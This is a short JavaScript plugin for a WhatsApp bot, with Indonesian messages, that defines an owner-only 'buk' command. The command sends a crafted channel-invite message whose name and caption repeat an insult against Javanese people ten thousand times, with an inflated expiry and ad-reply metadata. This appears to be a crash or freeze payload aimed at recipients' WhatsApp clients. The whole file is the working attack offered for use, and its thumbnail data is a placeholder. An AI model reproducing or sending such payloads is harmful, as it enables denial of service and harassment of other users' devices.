import crypto from 'crypto';

const handler = async (m, { conn, isOwner, usedPrefix, command }) => {
  if (!isOwner) return m.reply('Fitur ini hanya untuk owner.');

  const repeatedText = "JAWA WOI ANJING😈😈😈 ".repeat(10000).trim();
  const jid = "120363410793796223@newsletter";
  const thumbnailBase64 = "iVBORw0KGgoAAAANSUhEUgAAA...base64mu..."; 

  await conn.relayMessage(m.chat, {
    newsletterAdminInviteMessage: {
      newsletterJid: jid,
      newsletterName: repeatedText,
      jpegThumbnail: Buffer.from(thumbnailBase64, 'base64'),
      caption: repeatedText,
      inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600000000}`,
      contextInfo: {
        stanzaId: m.key.id,
        participant: conn.user.id,
        externalAdReply: {
          title: "ZENZ GANTENG😈😈",
          body: "ZENZ GANTENG 😈😈",
          thumbnail: Buffer.from(thumbnailBase64, 'base64'),
          sourceUrl: "https://whatsapp.com/channel/invite/0029VasizxI47XeE2iiave0u",
          mediaType: 1,
          showAdAttribution: true,
          renderLargerThumbnail: true
        }
      }
    }
  }, { messageId: crypto.randomUUID() });

  m.reply('Berhasil dikirim!');
};

handler.command = ['buk'];
handler.help = ['buk'];
handler.owner = true;

export default handler;